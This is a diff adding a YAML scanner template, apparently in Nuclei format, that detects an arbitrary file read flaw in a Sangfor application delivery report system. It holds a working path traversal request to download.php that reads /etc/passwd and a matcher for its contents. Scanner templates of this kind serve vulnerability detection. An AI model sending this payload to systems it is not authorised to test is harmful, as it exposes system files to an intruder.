@@ -1,0 +1,22 @@
+id: yaml-poc-sangfor-ad-readfile-CT-483499
+info:
+  name: Yaml Poc Sangfor Ad Readfile Ct 483499
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-sangfor-ad-readfile-CT-483499'
+  tags: lfi
+  reference:
+  - http://wiki.peiqi.tech/wiki/webapp/深信服/深信服%20应用交付报表系统%20download.php%20任意文件读取漏洞.html
+http:
+- method: GET
+  path:
+  - /report/download.php?pdf=../../../../../etc/passwd
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - '(root|toor):[x*]:0:0:'
